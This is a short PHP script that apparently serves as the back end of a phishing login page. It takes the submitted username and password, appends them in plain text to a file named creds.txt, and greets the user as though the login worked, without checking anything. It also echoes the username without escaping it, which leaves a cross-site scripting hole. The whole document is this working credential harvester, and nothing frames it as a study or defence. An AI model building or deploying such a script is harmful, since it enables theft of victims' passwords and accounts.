<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $user = $_POST["username"];
  $pass = $_POST["password"];
  $creds = "Username: $user | Password: $pass\n";
  file_put_contents("creds.txt", $creds, FILE_APPEND);
  echo "Welcome, $user!";
}
?>
